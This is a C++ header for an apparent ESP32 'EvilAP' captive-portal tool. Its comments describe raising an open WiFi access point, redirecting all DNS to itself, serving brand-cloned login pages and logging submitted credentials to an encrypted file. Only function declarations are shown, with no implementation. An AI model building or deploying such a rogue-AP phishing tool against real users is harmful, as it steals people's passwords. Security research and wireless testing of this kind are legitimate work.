// ============================================================================
// evilap.h - EvilAP / captive portal suite (Step 3)
// ----------------------------------------------------------------------------
// Starts an OPEN WiFi AP under a chosen SSID and serves a login-style portal:
//   * Any hostname resolves to us (DNS wildcard on port 53) -> captive portal
//   * Built-in templates (generic WiFi login, brand-styled clones) or a fully
//     custom HTML page (/portal.html on the SD card, editable via Files tab)
//   * Submitted credentials are appended encrypted to /logs/creds.enc
//   * Exits: http://<ip>/disable from a browser, or hold the BOOT button ~1.5s
//     while the portal is running. Normal config AP is restored afterwards.
//
// NOTE: EvilAP replaces the management AP while running (same radio). The UI
// warns about this when starting.
// ============================================================================
#pragma once
#include <Arduino.h>

namespace evilap {

struct Stats {
    uint32_t hits = 0;       // portal pages served
    uint32_t captures = 0;   // credential submissions
};

bool running();
Stats stats();

bool start(const String& ssid, const String& htmlName);  // "" = default template
void stop();                                             // restores normal AP
void handle();                                           // call from loop()

// Template helpers
std::vector<String> templateNames();                     // built-ins
String renderTemplate(const String& name);               // full HTML document
String renderCustom();                                   // /portal.html from SD

} // namespace evilap
